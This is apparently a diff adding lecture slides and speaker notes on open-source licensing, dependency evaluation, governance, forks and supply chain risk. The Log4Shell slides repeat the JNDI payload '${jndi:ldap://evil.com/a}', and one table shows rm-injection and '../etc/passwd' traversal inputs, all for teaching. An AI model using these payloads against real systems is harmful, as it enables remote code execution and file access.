+  <div className="fragment fade-out" data-fragment-index="2" style={{position: 'absolute', top: 0, left: '63%', width: '37%', height: '100%', backgroundColor: 'white', zIndex: 1}} />
+  {/* Mask over bottom callout under left + middle panels — fades out with right panel */}
+  <div className="fragment fade-out" data-fragment-index="2" style={{position: 'absolute', bottom: 0, left: 0, width: '63%', height: '15%', backgroundColor: 'white', zIndex: 3}} />
+</div>
+
+<aside className="notes">
+**These edge cases reveal:**
+- Licensing is never purely technical
+- It's always about what kind of world you want to build
+
+**The IBM story is real:**
+- Crockford confirmed it in a talk
+- "I give permission to IBM, its customers, partners, and minions to use JSLint for evil"
+
+**The SSPL controversy:**
+- MongoDB moved from AGPL to SSPL
+- SSPL: if you offer the software as a service, open-source your ENTIRE stack, including any related tools or infrastructure that you use to MANAGE that software-as-a-service operation!
+- OSI says this isn't "open source" — it's "source available"
+
+→ **Transition:** Now let's talk about evaluating dependencies...
+</aside>
+
+</Slide>
+
+{/* ============================================ */}
+{/* ARC 3: EVALUATING DEPENDENCIES */}
+{/* ============================================ */}
+
+<Slide>
+
+## Every Dependency Is a Commitment
+
+<p style={{fontSize: '0.85em'}}>
+Adding a dependency is easy — one line in <code>build.gradle</code>. But every dependency is a commitment.
+</p>
+
+<div style={{fontSize: '0.78em', marginTop: '1em'}}>
+
+Before adopting a library or framework, ask yourself:
+
+- **Who maintains this, and will they still be maintaining it in two years?**
+- **What happens if I need to switch away from it later?**
+- **Am I comfortable with the license terms?**
+- **How much will this shape the rest of my code?**
+
+</div>
+
+<div className="fragment" style={{marginTop: '1em', padding: '0.75em', border: '2px solid #FF9800', borderRadius: '8px', fontSize: '0.78em'}}>
+
+**The last question matters most:** A utility library for string formatting has minimal impact — swap it out easily. A web framework influences your entire application structure. Migrating away could mean a rewrite.
+
+</div>
+
+<aside className="notes">
+**The commitment you're making:**
+- Trusting someone else's code to work correctly
+- Trusting them to maintain it
+- Trusting them not to introduce vulnerabilities
+- Trusting them to keep the license stable
+
+**Library vs. Framework:**
+- Library: you call it (Jackson, lodash)
+- Framework: it calls you (Spring, React, Rails)
+- Frameworks are much harder to switch away from
+
+→ **Transition:** The most important factor in evaluation...
+</aside>
+
+</Slide>
+
+<Slide>
+
+## Community Health: The Most Important Factor
+
+<p style={{fontSize: '0.85em'}}>
+Before adopting a library, investigate who's behind it and how active they are:
+</p>
+
+<div style={{fontSize: '0.72em', marginTop: '1em'}}>
+
+| Indicator | What to Look For | Red Flags |
+|-----------|------------------|-----------|
+| **Recent activity** | Last commit? Last release? | No updates in 2+ years |
+| **Issue responsiveness** | Are bugs acknowledged? PRs reviewed? | 500 ignored issues |
+| **Bus factor** | How many core maintainers? | Single maintainer |
+| **Documentation** | Up-to-date? Comprehensive? | Outdated or missing docs |
+
+</div>
+
+<div className="fragment" style={{marginTop: '1em', padding: '0.75em', backgroundColor: 'rgba(255, 152, 0, 0.1)', borderRadius: '8px', fontSize: '0.75em'}}>
+
+**Sobering reality:** OpenSSL — securing most of the internet — was maintained by a handful of volunteers until the Heartbleed vulnerability exposed how underfunded critical infrastructure can be.
+
+</div>
+
+<aside className="notes">
+**A library with no updates might be:**
+- Stable and complete (rare)
+- Abandoned (more common)
+
+**The bus factor:**
+- If one person maintains a critical library in their spare time...
+- What happens when they burn out? Move on? Get hired by a company that doesn't allow OSS work?
+
+**Heartbleed (2014):**
+- Critical vulnerability in OpenSSL
+- Affected ~17% of "secure" web servers
+- Maintained by 2 people, one full-time
+- Led to creation of Core Infrastructure Initiative
+
+→ **Transition:** Different governance models have different risks...
+</aside>
+
+</Slide>
+
+<Slide>
+
+## Governance Models Shape Long-Term Risk
+
+<div style={{fontSize: '0.7em', marginTop: '0.5em'}}>
+
+| Model | Examples | Pros | Cons |
+|-------|----------|------|------|
+| **Corporate-backed** | Chromium (Google), React (Meta), TensorFlow (Google) | Well-funded, full-time devs | Priorities may shift; may change license |
+| **Foundation-governed** | Apache projects, Linux Foundation, Python SF | Community governance, stable long-term | May move slower |
+| **Community/Individual** | Many small libraries and utilities | Innovative, responsive | High abandonment risk; may lack security audits |
+
+</div>
+
+<div className="fragment" style={{marginTop: '1em'}}>
+<p style={{fontSize: '0.8em', fontWeight: 'bold', color: '#FF9800'}}>
+Watch out for license changes:
+</p>
+<ul style={{fontSize: '0.72em'}}>
+  <li>MongoDB: AGPL → Server Side Public License (SSPL)</li>
+  <li>HashiCorp: Terraform from MPL → Business Source License (BSL)</li>
+  <li>Redis: BSD → dual-license with SSPL</li>
+</ul>
+</div>
+
+<aside className="notes">
+**Corporate-backed risks:**
+- Google killed Google Reader, Stadia, etc. — they could deprioritize a project
+- Meta could change React's license if business needs change
+- Corporate priorities ≠ your priorities
+
+**Foundation-governed advantages:**
+- Apache, Linux Foundation have processes for succession
+- No single company can make unilateral changes
+- But: some "foundations" are just fronts for one company
+
+**The license change pattern:**
+- Company open-sources project to gain adoption
+- Project becomes successful, competitors use it
+- Company changes license to monetize
+- Community must decide: accept or fork?
+
+**The three cases in detail:**
+
+1. **MongoDB (2018): AGPL → SSPL**
+   - AGPL required sharing source if you distributed modifications
+   - BUT cloud providers (AWS, etc.) ran MongoDB as-a-service without contributing back — the "SaaS loophole"
+   - SSPL closes the loophole: if you offer it as a service, you must open-source your ENTIRE stack (management, orchestration, monitoring — everything)
+   - Effectively blocks cloud providers from competing without paying MongoDB or open-sourcing their cloud infrastructure
+   - OSI ruled SSPL is NOT open source — it's "source available"
+
+2. **HashiCorp/Terraform (2023): MPL → BSL**
+   - Terraform was Mozilla Public License — permissive, widely adopted
+   - Cloud providers offered Terraform-compatible services, competing with HashiCorp's commercial offerings
+   - BSL (Business Source License): you can VIEW the code, but can't use it to compete with HashiCorp
+   - Community immediately forked as **OpenTofu** under Linux Foundation
+   - This is the Terraform→OpenTofu fork we'll see on the next slide
+
+3. **Redis (2024): BSD → dual SSPL**
+   - Redis was BSD — one of the most permissive licenses
+   - Same cloud provider concern: AWS ElastiCache, etc. competed without contributing
+   - Changed to dual license: SSPL for new versions, or pay for commercial license
+   - Led to fork: **Valkey** under Linux Foundation
+
+**The pattern:** Open source to gain adoption → success attracts competitors → change license to capture value → community forks
+
+→ **Transition:** When governance fails, communities fork...
+</aside>
+
+</Slide>
+
+<Slide>
+
+## When Governance Fails: The Fork
+
+<div style={{fontSize: '0.7em', marginTop: '0.5em'}}>
+
+| Original | Fork | What Happened |
+|----------|------|---------------|
+| **MySQL** | MariaDB | Oracle acquired Sun (2009). Community worried about stewardship. |
+| **OpenOffice** | LibreOffice | Oracle fired developers (2010). Community forked. LibreOffice won. |
+| **Terraform** | OpenTofu | HashiCorp changed to restrictive license (2023). Linux Foundation hosts the fork. |
+
+</div>
+
+<div className="fragment" style={{marginTop: '1em', padding: '0.75em', border: '2px solid #FF9800', borderRadius: '8px', fontSize: '0.8em'}}>
+
+**The code can live on — but the disruption is painful for everyone.** Forks are possible because the source is open. The only thing original creators keep is the trademark.
+
+</div>
+
+<aside className="notes">
+**A fork is possible because:**
+- Source code is available under open license
+- Anyone can take it and develop independently
+- The only thing original creators keep: the trademark
+
+**The OpenOffice story:**
+- Sun open-sourced StarOffice as OpenOffice (1999)
+- Oracle acquired Sun (2010), fired core developers
+- Community forked as LibreOffice immediately
+- Oracle donated remnants to Apache — too late, LibreOffice had won
+
+**The lesson:**
+- Governance matters more than code quality
+- A project with healthy community governance is more resilient
+- If governance fails, code can live on — but disruption is painful
+
+→ **Transition:** Behind every dependency is a person...
+</aside>
+
+</Slide>
+
+<Slide>
+
+## The Human Side of Open Source
+
+<p style={{fontSize: '0.85em'}}>
+Behind every dependency in your <code>build.gradle</code> is a person — often unpaid, often alone.
+</p>
+
+<div style={{display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '1.5em', marginTop: '1em', fontSize: '0.72em'}}>
+
+<div style={{padding: '0.75em', border: '2px solid #FF9800', borderRadius: '8px'}}>
+
+**The reality of OSS maintenance:**
+- Most critical infrastructure runs on **volunteer labor**
+- OpenSSL (secures the internet): 2 maintainers pre-Heartbleed
+- Burnout is the #1 cause of project abandonment
+
+</div>
+
+<div style={{padding: '0.75em', border: '2px solid #9370DB', borderRadius: '8px'}}>
+
+**L22's bus factor — at ecosystem scale:**
+- Your team has 4 people. What if one leaves?
+- SnakeYAML has **one** maintainer. What if *they* leave?
+- The consequences ripple across thousands of projects
+- This isn't a team problem — it's an industry problem
+
+</div>
+
+</div>
+
+<div className="fragment" style={{marginTop: '1em', padding: '0.75em', backgroundColor: 'rgba(255, 152, 0, 0.1)', borderRadius: '8px', fontSize: '0.8em'}}>
+
+**The paradox:** We trust billion-dollar systems to maintainers we've never met, often without paying them. The same HRT principles from L22 apply here — except the "team" is the entire open source community.
+
+</div>
+
+<aside className="notes">
+**Connect to L22:**
+- L22 introduced bus factor for your team (4 people)
+- Today: bus factor for the ECOSYSTEM — one maintainer controls a library used by millions
+- Same HRT principles apply, but the stakes are higher
+
+**core-js story:**
+- core-js provides JavaScript polyfills used by ~75% of top websites
+- Maintained by one person, Denis Pushkarev
+- He was imprisoned after a car accident — and the project nearly died
+- Millions of websites depended on one person's freedom
+
+**The xkcd 2347 problem:**
+- "All modern digital infrastructure depends on a project some random person in Nebraska has been thanklessly maintaining since 2003"
+- This isn't a joke — it's literally how the industry works
+
+→ **Transition:** So what can we do about it?
+</aside>
+
+</Slide>
+
+<Slide>
+
+## A Well-Maintained Library Beats DIY for Security
+
+<p style={{fontSize: '0.85em'}}>
+Is it safer to use a popular library or write your own? <strong>Almost always use the library</strong> — if it's well-maintained.
+</p>
+
+<div style={{display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '1.5em', marginTop: '1em', fontSize: '0.7em'}}>
+
+<div style={{padding: '0.75em', border: '2px solid #4CAF50', borderRadius: '8px'}}>
+
+**Why well-maintained libraries win:**
+- Battle-tested by thousands of users
+- Security researchers scrutinize popular projects
+- Vulnerabilities get reported and patched
+- You benefit from specialists' expertise
+
+</div>
+
+<div style={{padding: '0.75em', border: '2px solid #FF9800', borderRadius: '8px'}}>
+
+**When dependencies introduce risk:**
+- Every dependency is an attack surface
+- Transitive dependencies multiply the risk
+- Unmaintained dependencies don't get patches
+- You're trusting code you've never read
+
+</div>
+
+</div>
+
+<div className="fragment" style={{marginTop: '1em'}}>
+<p style={{fontSize: '0.8em', color: '#9370DB'}}>
+<strong>The key insight:</strong> You're unlikely to out-engineer the Jackson team at JSON parsing, or the Spring Security team at authentication. But you DO need to keep your dependencies updated.
+</p>
+</div>
+
+<aside className="notes">
+**The math:**
+- Your implementation: tested by you, maybe your team
+- Jackson: tested by millions of users, security researchers, enterprise customers
+- Who's more likely to catch edge cases?
+
+**But dependencies DO introduce risk:**
+- Your app might include libraries you've never heard of (transitive deps)
+- One compromised package can compromise everything downstream
+- The left-pad incident, Log4Shell — these are real
+
+→ **Transition:** Let's look at supply chain attacks...
+</aside>
+
+</Slide>
+
+<Slide>
+
+## Supply Chain Attacks: When Dependencies Become Vectors
+
+<p style={{fontSize: '0.85em'}}>
+An attacker compromises a package deep in the dependency tree. Your app pulls it in transitively — you never knew it existed. Now the attacker's code runs in your application.
+</p>
+
+<div style={{fontSize: '0.72em', marginTop: '1em'}}>
+
+| Incident | What Happened | Impact |
+|----------|---------------|--------|
+| **left-pad (2016)** | Developer unpublished an 11-line npm package | Thousands of builds broke — Facebook, Spotify, others |
+| **Log4Shell (2021)** | Critical remote code execution in Log4j | Millions of apps affected; months to remediate |
+
+</div>
+
+<div className="fragment" style={{marginTop: '1em', padding: '0.75em', border: '2px solid #FF9800', borderRadius: '8px', fontSize: '0.8em'}}>
+
+**A chain is only as strong as its weakest link.** The risks compound when you adopt a library and never update it, the library is abandoned, or a malicious actor compromises it.
+
+</div>
+
+<aside className="notes">
+**The supply chain attack model:**
+- Attacker compromises a package deep in the dependency tree
+- Your app pulls it in transitively — you never knew it existed
+- Attacker's code now runs in your application
+
+**left-pad (2016):**
+- Developer unpublished an 11-line npm package
+- Thousands of builds broke — including Facebook, Spotify
+- Not malicious, but showed the fragility
+
+**Log4Shell (2021):**
+- Critical remote code execution in Log4j
+- Log4j is EVERYWHERE — Java logging is ubiquitous
+- Affected millions of applications worldwide
+- Took months to fully remediate across the industry
+
+**The risks come when:**
+1. You adopt a library and never update it
+2. The library is abandoned and stops receiving patches
+3. A malicious actor compromises the library or its dependencies
+
+→ **Transition:** So what can YOU do about this?
+</aside>
+
+</Slide>
+
+<Slide>
+
+## Log4Shell: When a Logging Library Became an Attack Vector
+
+<p style={{fontSize: '0.85em'}}>
+In December 2021, a critical vulnerability in <strong>Log4j</strong> — a ubiquitous Java logging library — exposed millions of systems to remote code execution. This is the supply chain attack that changed how the industry thinks about dependencies.
+</p>
+
+<div style={{fontSize: '0.62em', marginTop: '0.75em'}}>
+
+```mermaid
+sequenceDiagram
+    participant Attacker
+    participant YourApp as Your Application
+    participant Log4j
+    participant LDAP as Attacker's LDAP Server
+    participant Malware as Malicious Code
+
+    Attacker->>YourApp: Send malicious string in any logged field<br/>(username, search query, User-Agent...)
+    YourApp->>Log4j: log.info("User login: " + username)
+    Note over Log4j: Log4j sees ${jndi:ldap://evil.com/a}<br/>and EXECUTES it as a lookup
+    Log4j->>LDAP: Fetch ldap://evil.com/a
+    LDAP->>Log4j: Return reference to Malware.class
+    Log4j->>Malware: Load and execute attacker's code
+    Note over Malware: Full control of your server
+```
+
+</div>
+
+<div className="fragment" style={{marginTop: '0.75em', padding: '0.5em', border: '2px solid #FF9800', borderRadius: '8px', fontSize: '0.75em'}}>
+
+**The attack in plain English:** Log4j had a "helpful" feature that let logged strings contain lookups like `${jndi:ldap://...}`. If an attacker put this string *anywhere* your app logged — a username field, a search box, even a browser User-Agent header — Log4j would fetch and execute code from the attacker's server.
+
+</div>
+
+<aside className="notes">
+**Why Log4Shell was so devastating:**
+
+1. **Ubiquity:** Log4j is THE standard Java logging library. It's in nearly every Java application — including ones you've never heard of that run inside products you use daily. Minecraft, iCloud, Steam, Twitter — all affected.
+
+2. **Trivial to exploit:** The attacker just needs to get a malicious string logged. That's it. Send `${jndi:ldap://evil.com/a}` as your username, in a search query, in a User-Agent header, in a chat message — anywhere the app logs user input.
+
+3. **The "feature" that became a vulnerability:**
+   - Log4j supported "lookups" — variable substitution in log messages
+   - `${env:USER}` would expand to the username
+   - `${jndi:ldap://...}` would fetch data from an LDAP server
+   - The JNDI lookup could return a Java class reference — which Log4j would then LOAD AND EXECUTE
+   - This was a documented feature, not a bug — it was DESIGNED to do this
+
+4. **Why it went undetected for 8+ years:**
+   - The feature was added in 2013
+   - Security researchers weren't looking at logging libraries for RCE
+   - The feature was obscure — most developers didn't know it existed
+   - Code audits focused on "obvious" attack surfaces like web endpoints
+   - Nobody thought "what if someone logs a malicious string?" because logging feels safe
+
+**The remediation nightmare:**
+- You don't just update YOUR Log4j — you update every dependency that includes it
+- Some apps bundled Log4j inside other JARs (shaded dependencies)
+- Some vendors took weeks to release patches
+- Some systems couldn't be updated without breaking other things
+
+→ **Transition:** This connects directly to L20's security concepts...
+</aside>
+
+</Slide>
+
+<Slide>
+
+## Why Nobody Saw It Coming: "It's Just Logging"
+
+<p style={{fontSize: '0.82em'}}>
+You wouldn't pass user input directly to dangerous operations. But <strong>logging doesn't feel dangerous</strong>.
+</p>
+
+<div style={{fontSize: '0.63em', marginTop: '0.75em'}}>
+
+| Operation | Would You Pass User Input Directly? |
+|-----------|-------------------------------------|
+| `Runtime.exec("rm " + userInput)` | **No way!** User could type ` -rf /` and delete everything |
+| `new File(userInput).delete()` | **No way!** User could type `../../../etc/passwd` |
+| `log.info("User searched for: " + userInput)` | **Sure, why not?** It's just writing text to a file... |
+
+</div>
+
+<div className="fragment" style={{fontSize: '0.55em', marginTop: '0.75em'}}>
+
+```mermaid
+graph LR
+    subgraph "Your Mental Model"
+        Input["User Input"] -->|"Obviously dangerous"| Exec["Runtime.exec()"]
+        Input -->|"Obviously dangerous"| File["File operations"]
+        Input -->|"It's just text..."| Log["log.info()"]
+    end
+
+    subgraph "Log4j's Reality"
+        Log -->|"Parse for ${...}"| Lookup["Variable Lookup"]
+        Lookup -->|"Execute JNDI"| Network["Network Request"]
+        Network -->|"Load class"| RCE["Code Execution"]
+    end
+
+    style Log fill:#FF980044,stroke:#FF9800,stroke-width:3px
+    style RCE fill:#f4433644,stroke:#f44336
+```
+
+</div>
+
+<div className="fragment" style={{marginTop: '0.5em', padding: '0.5em', backgroundColor: 'rgba(244, 67, 54, 0.1)', borderRadius: '8px', fontSize: '0.75em'}}>
+
+**The trust assumption that broke:** Every developer assumed `log.info(userInput)` was a *sink* — data goes in, gets written to a file, nothing else happens. Log4j made it a *source* of network requests and code execution. Logging became as dangerous as `Runtime.exec()` — but nobody knew.
+
+</div>
+
+<aside className="notes">
+**The psychology of why this went undetected:**
+
+1. **Mental model of logging:**
+   - Logging feels like `System.out.println()` — it just writes text somewhere
+   - Nobody thinks "what if the logging library executes my strings?"
+   - Everyone knows not to pass user input to Runtime.exec() or ProcessBuilder
+   - But logging? That's just... printing. What could go wrong?
+
+2. **The trust assumption:**
+   - You would NEVER write: `Runtime.exec(userInput)` — that's obviously dangerous
+   - But `log.info(userInput)`? That seems completely safe
+   - Log4j's lookup feature meant logging WAS like Runtime.exec()
+   - `${jndi:ldap://evil.com}` wasn't "text to write" — it was "instruction to execute"
+
+3. **Connect to L20's trust boundaries:**
+   - L20 taught: "Draw lines where trust ends — validate everything that crosses"
+   - You drew your boundary at the API. Log4j had a HIDDEN boundary you didn't know about.
+   - Your user input crossed YOUR trust boundary (validated) → then crossed Log4j's hidden boundary (not validated) → remote code execution
+
+4. **The "Fallacy 4" extension:**
+   - L20 Fallacy 4: "The network is secure" — you can't trust network traffic
+   - Log4Shell adds: "The dependency is secure" — you can't blindly trust what dependencies do with your data
+   - The network between your code and Log4j is "safe" (same JVM), but the TRUST wasn't safe
+
+**The architectural lesson:**
+- Your trust boundary extends through your entire dependency tree
+- A "safe" operation (logging) became unsafe because of how a dependency implemented it
+- This is why dependency hygiene is a security practice, not just housekeeping
+- Tools like Dependabot, Snyk scan for known vulnerabilities — use them
+
+→ **Transition:** So what can YOU do to be a responsible participant in this ecosystem?
+</aside>
+
+</Slide>
+
+<Slide>
+
+## Being a Good OSS Citizen
+
+<p style={{fontSize: '0.85em'}}>
+You're not just a consumer of open source — you're a participant. L22's HRT principles apply to the global community, not just your team.
+</p>
+
+<div style={{display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '1.5em', marginTop: '1em', fontSize: '0.72em'}}>
+
+<div style={{padding: '0.75em', border: '2px solid #4CAF50', borderRadius: '8px'}}>
+
+**Apply L22's practices to OSS:**
+- **File good issues** — you learned this in L22. Same template: steps to reproduce, expected vs. actual, environment.
+- **Look for "good first issue" labels** — many projects tag beginner-friendly tasks. This is your on-ramp.
+- **Contribute docs**, not just code — the most impactful first contribution is often a typo fix or a clearer example
+- **Respect maintainer time** — they owe you nothing. A polite, well-researched issue gets answered; "fix this!" gets ignored.
+
+</div>
+
+<div style={{padding: '0.75em', border: '2px solid #9370DB', borderRadius: '8px'}}>
+
+**Apply L22's HRT:**
+- **Humility:** You're new to their codebase. Ask before assuming.
+- **Respect:** Read the CONTRIBUTING.md before submitting a PR. Follow their conventions, not yours.
+- **Trust:** If a maintainer closes your issue, assume good faith. Ask why, don't demand.
+
+</div>
+
+</div>
+
+<div className="fragment" style={{marginTop: '1em', padding: '0.75em', border: '2px solid #FF9800', borderRadius: '8px', fontSize: '0.8em'}}>
+
+**Start now:** Every one of you uses open source daily. You can contribute today — report a bug, improve docs, answer a question on Stack Overflow. You don't need permission to participate in the bazaar.
+
+</div>
+
+<aside className="notes">
+**The L22 connection:**
+- L22 taught GitHub issues, PRs, code review, HRT — ALL of these apply to OSS participation
+- The difference: your team has 4 people who know each other. An OSS project has strangers worldwide.
+- Written communication matters even MORE here (L22's scalable knowledge sharing)
+
+**Practical starting points for students:**
+- Found a confusing error message? File an issue with context.
+- Documentation wrong or unclear? Submit a PR fixing it.
+- Answer questions in project discussions — you don't have to be an expert to help someone newer than you.
+
+**The culture matters:**
+- Some projects are welcoming (look for "good first issue" labels)
+- Some are hostile — that's a signal about governance health (connects back to earlier slides)
+- A project's community culture IS an evaluation criterion
+
+→ **Transition:** Let's tie everything back to architecture...
+</aside>
+
+</Slide>
+
+{/* ============================================ */}
+{/* ARC 4: MODULARITY, BOUNDARIES, AND THE BAZAAR */}
+{/* ============================================ */}
+
+<Slide>
+
+## Why the Bazaar Works: Modularity All the Way Down
+
+<p style={{fontSize: '0.85em'}}>
+The bazaar model only works because of <strong>information hiding</strong>. Every successful OSS library is a module with a clean boundary.
+</p>
+
+<div style={{fontSize: '0.7em', marginTop: '1em'}}>
+
+```mermaid
+graph LR
+    You["Your Code"] -->|"ObjectMapper API"| Jackson["Jackson Internals<br/>(hidden)"]
+    You -->|"DataSource API"| HikariCP["HikariCP Internals<br/>(hidden)"]
+    You -->|"HttpClient API"| OkHttp["OkHttp Internals<br/>(hidden)"]
+
+    style Jackson fill:#9370DB22,stroke:#9370DB
+    style HikariCP fill:#9370DB22,stroke:#9370DB
+    style OkHttp fill:#9370DB22,stroke:#9370DB
+```
+
+</div>
+
+<div className="fragment" style={{marginTop: '1em', padding: '0.75em', border: '2px solid #9370DB', borderRadius: '8px', fontSize: '0.8em'}}>
+
+**You don't know — and shouldn't care — how Jackson tokenizes JSON internally.** That's the whole point. Information hiding is what lets strangers' code snap together like LEGO bricks.
+
+</div>
+
+<aside className="notes">
+**The deep connection:**
+- L17: We learned about information hiding and dependency injection
+- L18: We learned about drawing boundaries at the right places
+- Today: ALL of that is what makes the bazaar possible
+
+**Without information hiding, OSS doesn't work:**
+- If Jackson exposed its internal tokenizer state, every update could break you
+- If Spring leaked its internal request-handling pipeline, you'd be coupled to implementation details
+- The API boundary IS the contract between you and a stranger's code
+
+**Parnas's insight applies globally:**
+- "Hide design decisions likely to change"
+- OSS libraries change ALL THE TIME — that's their right
+- Information hiding is what lets them change without breaking you
+
+→ **Transition:** But what happens when boundaries are wrong?
+</aside>
+
+</Slide>
+
+<Slide>
+
+## Bad Boundaries Make OSS Adoption Impossible
+
+<p style={{fontSize: '0.85em'}}>
+If your code violates information hiding, you <strong>can't swap components</strong> — even when better alternatives exist.
+</p>
+
+<div style={{display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '1.5em', marginTop: '1em', fontSize: '0.62em'}}>
+
+<div style={{padding: '0.75em', border: '2px solid #FF9800', borderRadius: '8px'}}>
+
+**Leaky boundary — locked in:**
+```java
+// Scattered throughout your codebase
+JsonNode node = new ObjectMapper()
+    .readTree(input);
+// Cast to Jackson-specific types
+ObjectNode obj = (ObjectNode) node;
+obj.put("key", "value");
+// Use Jackson's streaming API directly
+JsonParser parser = factory.createParser(input);
+while (parser.nextToken() != null) { ... }
+```
+
+*Jackson internals leaked everywhere. Switching to Gson? Rewrite the whole app.*
+
+</div>
+
+<div style={{padding: '0.75em', border: '2px solid #4CAF50', borderRadius: '8px'}}>
+
+**Clean boundary — swappable:**
+```java
+// One place defines the contract
+public interface JsonSerializer {
+    <T> String toJson(T object);
+    <T> T fromJson(String json, Class<T> type);
+}
+
+// Jackson implementation (hidden behind boundary)
+class JacksonSerializer implements JsonSerializer {
+    private final ObjectMapper mapper =
+        new ObjectMapper();
+    // ... implementation details stay here
+}
+```
+
+*Switch to Gson? Write one new class. Nothing else changes.*
+
+</div>
+
+</div>
+
+<div className="fragment" style={{marginTop: '1em', fontSize: '0.8em', fontWeight: 'bold', color: '#FF9800'}}>
+L18's boundary heuristics told you: isolate things that change independently. OSS libraries change on THEIR schedule, not yours. That's exactly where a boundary belongs.
+</div>
+
+<aside className="notes">
+**This is L17 + L18 in practice:**
+- L17: Inject dependencies through interfaces, don't hardcode
+- L18: Draw boundaries where rate of change differs
+- OSS libraries change at THEIR rate — you don't control it
+- If you didn't draw the boundary, you're coupled to their release schedule
+
+**Real-world pain:**
+- Teams that scattered Hibernate-specific annotations everywhere couldn't migrate
+- Teams that used Spring's RestTemplate directly throughout had to rewrite when WebClient replaced it
+- Teams that wrapped their HTTP client behind an interface? Swapped in 30 minutes.
+
+**The lesson:**
+- The boundary between your code and an OSS library is one of the MOST important boundaries in your system
+- Get it wrong, and you're locked in for the life of the project
+- Get it right, and the bazaar becomes a superpower — swap components freely
+
+→ **Transition:** This works in both directions...
+</aside>
+
+</Slide>
+
+<Slide>
+
+## Modularity Works Both Ways
+
+<p style={{fontSize: '0.85em'}}>
+Good boundaries don't just help you <strong>consume</strong> OSS — they're what make your code <strong>reusable</strong> in the first place.
+</p>
+
+<div style={{fontSize: '0.55em', marginTop: '0.5em'}}>
+
+```mermaid
+graph TD
+    subgraph "Well-modularized system"
+        A["Web Controller"] --> B["Business Logic"]
+        B --> C["Data Access"]
+        B --> D["Email Service"]
+        B --> E["PDF Generator"]
+    end
+
+    subgraph "Reusable as OSS?"
+        E -.->|"Clean interface,<br/>no hidden coupling"| OSS["✅ Extract as library"]
+        D -.->|"Depends only on<br/>its own interface"| OSS2["✅ Extract as library"]
+        A -.->|"Coupled to Spring MVC,<br/>business objects"| NOPE["❌ Too entangled"]
+    end
+```
+
+</div>
+
+<div className="fragment" style={{marginTop: '0.5em', fontSize: '0.75em'}}>
+
+**What makes a module extractable into a reusable library?**
+
+| Principle | What It Enables |
+|-----------|----------------|
+| **Information hiding** | Users don't depend on your internals — you can evolve freely |
+| **Clean interfaces** | Users know exactly what to call and what to expect |
+| **Minimal dependencies** | Users don't inherit YOUR dependency tree |
+| **Single responsibility** | Users adopt only what they need — nothing extra |
+
+</div>
+
+<div className="fragment" style={{marginTop: '0.5em', padding: '0.5em', border: '2px solid #9370DB', borderRadius: '8px', fontSize: '0.8em'}}>
+
+**Every great OSS library started as a well-modularized internal component that someone realized others could use.** Jackson, React, Kubernetes — all extracted from internal systems because the boundaries were clean enough to share.
+
+</div>
+
+<aside className="notes">
+**The bazaar is built from well-designed modules:**
+- Jackson was extracted from FasterXML's internal tools
+- React was extracted from Facebook's internal UI framework
+- Kubernetes was extracted from Google's internal Borg system
+- Spring was extracted from Rod Johnson's book examples
+
+**What they all had in common:**
+- Clean API boundary (information hiding)
+- Minimal coupling to the parent system
+- Single, well-defined responsibility
+- Could be understood and used without understanding the original system
+
+**The flip side — what CAN'T be extracted:**
+- Code that reaches into other modules' internals
+- Code with hidden dependencies on global state
+- Code that does too many things (violates SRP)
+- Code whose interface exposes implementation details
+
+**Connect to their experience:**
+- In your assignments, could you extract your data access layer and publish it?
+- If not, what would need to change?
+- The answer is almost always: better boundaries
+
+→ **Transition:** Let's see the full picture...
+</aside>
+
+</Slide>
+
+<Slide>
+
+## The Virtuous Cycle: Modularity Enables the Ecosystem
+
+<div style={{fontSize: '0.5em', marginTop: '0.5em'}}>
+
+```mermaid
+graph LR
+    IH["Information Hiding<br/>(L17)"] -->|"enables"| CB["Clean Boundaries<br/>(L18)"]
+    CB -->|"enables"| SW["Swappable<br/>Components"]
+    SW -->|"enables"| BA["Bazaar Adoption<br/>(L23)"]
+    BA -->|"enables"| RE["Reuse at Scale"]
+    RE -->|"demands"| IH
+
+    style IH fill:#9370DB22,stroke:#9370DB
+    style CB fill:#4CAF5022,stroke:#4CAF50
+    style SW fill:#FF980022,stroke:#FF9800
+    style BA fill:#2196F322,stroke:#2196F3
+    style RE fill:#E91E6322,stroke:#E91E63
+```
+
+</div>
+
+<div style={{marginTop: '1em', fontSize: '0.78em'}}>
+
+<p>Every principle we've studied this semester reinforces the others:</p>
+
+<ul>
+  <li><strong>Information hiding</strong> lets strangers' code work together without understanding each other's internals</li>
+  <li><strong>Clean boundaries</strong> let you swap one library for another when licenses change, maintainers disappear, or better options emerge</li>
+  <li><strong>Modularity</strong> is what lets a single developer in Tokyo publish a component on Monday that teams worldwide adopt by Friday</li>
+  <li><strong>Testability</strong> depends on all of the above — can you mock that dependency? Only if you injected it (L17) behind a clean interface (L18)</li>
+</ul>
+
+</div>
+
+<div className="fragment" style={{marginTop: '0.75em', padding: '0.75em', backgroundColor: 'rgba(147, 112, 219, 0.1)', borderRadius: '8px', fontSize: '0.85em', fontWeight: 'bold'}}>
+
+The bazaar doesn't work without modularity. And modularity doesn't matter without the bazaar to supply the components. They need each other. Every time you type <code style={{fontWeight: 'normal'}}>implementation 'some:library:1.0'</code>, you're making an architectural decision. Evaluate it like one.
+
+</div>
+
+<aside className="notes">
+**The big picture:**
+- This is the culmination of L17 → L18 → L19 → L23
+- Information hiding isn't an academic exercise — it's what makes the modern software ecosystem possible
+- Without it, every library would leak internals, every update would break consumers, and the bazaar would collapse
+
+**The virtuous cycle:**
+- Better modularity → easier to publish reusable code → more OSS available → more reason to design modular systems → better modularity
+- This cycle has been accelerating for 30 years
+- npm, Maven Central, PyPI — they exist because modularity works
+
+**Connect to L18 "build vs. buy":**
+- L18 compared thick action vs platform-driven architectures
+- "Buy" almost always means "adopt OSS" — the same coupling vs. capability tradeoffs apply
+- OSS choices directly impact every -ility: maintainability (who fixes bugs when the maintainer burns out?), security (supply chain attacks), changeability (license changes can force rewrites)
+
+**The warning:**
+- Break the cycle at any point and it falls apart
+- Leak your abstractions? Can't swap components.
+- Couple to internals? Can't upgrade.
+- Skip boundaries? Can't extract reusable modules.
+
+**This is why we spent weeks on these principles — they're not just good engineering, they're the foundation the entire industry is built on.**
+</aside>
+
+</Slide>
+
+</RevealJS>
